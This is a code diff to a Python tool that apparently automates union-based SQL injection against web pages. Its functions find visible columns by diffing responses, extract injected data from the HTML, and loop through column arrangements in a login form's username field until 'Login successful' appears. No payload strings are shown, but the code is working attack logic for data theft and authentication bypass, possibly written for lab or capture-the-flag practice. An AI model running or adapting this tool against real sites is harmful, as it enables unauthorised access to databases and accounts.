@@ -64,8 +64,8 @@ def count_columns(url: str, payload: str, p: str, cook={}, encode=none_func) -> 
 
 
 def find_visible_columns(url: str, num_columns: int,
-                         payload: str, p: str, p_base: str,
-                         cook={}, encode=none_func) -> list:
+                         payload: dict, p_base: dict,
+                         cook={}, method='get') -> list:
     '''
     The function finds the columns displayed on the web page after a get request (param).
     The request is transmitted via get (param), the response is the content of the web page.
@@ -77,32 +77,32 @@ def find_visible_columns(url: str, num_columns: int,
     html_visible: response from the web page with visible columns
     '''
 
-    list_of_visible = []
-    print(payload)
-    param = {p: encode(payload)}
-    html_visible = get_request(url, param, cook)
+    list_of_visible = set()
+    html_visible = get_request(url, payload, cook, method)
 
     # Find differens
-    param = {p: p_base}
-    html_base = get_request(url, param, cook)
+    html_base = get_request(url, p_base, cook, method)
+
     for s in difflib.ndiff(html_visible, html_base):
         if s[0] == ' ':
             continue
         elif s[0] == '-':
             try:
-                if int(s[-1]) in range(num_columns + 1):
-                    list_of_visible.append(int(s[-1]))
+                if int(s[-1]) in range(num_columns + 1) and '>' + s[-1] + '<' in html_visible:
+                    list_of_visible.add(int(s[-1]))
             except:
                 continue
+
     if not list_of_visible:
         print('not find visible column')
         exit(1)
-    return [list_of_visible, html_visible]
+    print(list_of_visible)
+    return [list(list_of_visible), html_visible]
 
 
 def find_param(url: str,
                len_key: int, html_visible: str,
-               payload: str, p: str, cook={}, encode=none_func) -> list:
+               payload: dict, cook={}, method='get') -> list:
     '''
     The function finds desired data in visible columns in the response.
     The request is transmitted via get (param), the response is the content of the web page.
@@ -112,40 +112,41 @@ def find_param(url: str,
     html_responce: response from the web page
     key: list of desired data
     '''
-    
-    param = {p: encode(payload)}
-    html_response = get_request(url, param, cook)
-    
+
+    html_response = get_request(url, payload, cook, method)
+
     # Find differens
-    key = ['']*len_key
+    key = [''] * len_key
     j = 0
     html_r = html_response.split('\n')
-    print(html_r)
     html_v = html_visible.split('\n')
-    print(html_v)    
-    for i,r in enumerate(html_r):
+
+    for i, r in enumerate(html_r):
+        if 'select' in r or 'SELECT' in r:
+            # We do not consider lines with the request text
+            continue
         r = r.replace('</td>', '')
         v = (html_v[i].replace('</td>', '')).ljust(len(r))
         strings = [r, v]
         diff = map(str.__ne__, *strings)
         df = [''.join(compress(s, diff)) for s in strings]
         if df != ['', '']:
-            print('df', df, df[0])
-            key[j] = df[0]
+            if j == len(key):
+                # if the output contains a string that differs from the base one,
+                # but does not contain the key
+                key.append('')
+            key[j] = df[0].replace(
+                '</b>', '').replace('<b>', '').replace('<br>', ' ')
             j += 1
-            
-    #if key in one string
-    if key[1] == '':
-        tmp = ''
-        i = 0
-        while key[0][i] != '<':
-            tmp += key[0][i]
-            i += 1
-        key[0] = key[0].replace('</b>', '').replace('<br>', '')
-        key[1] = key[0][i:]
-        key[0] = tmp
 
-    return key
+    keys = []
+    for k in key:
+        k = k.split(' ')
+        for i in k:
+            if i != '':
+                keys.append(i)
+
+    return keys
 
 
 def find_column_position(url: str, list_of_columns: list, payload: str,
@@ -189,8 +190,9 @@ def try_auth(url: str, list_of_columns: list, data: str,
         data_dict = data.copy()
         tmp = list_of_columns[i]
         list_of_columns[i] = finds
-        data_dict['username'] = data_dict['username'] % ','.join(list_of_columns)
-        response = get_request(url+p, data_dict, cook, 'post')
+        data_dict['username'] = data_dict['username'] % ','.join(
+            list_of_columns)
+        response = get_request(url + p, data_dict, cook, 'post')
         if 'Login successful' in response:
             return response
         list_of_columns[i] = tmp
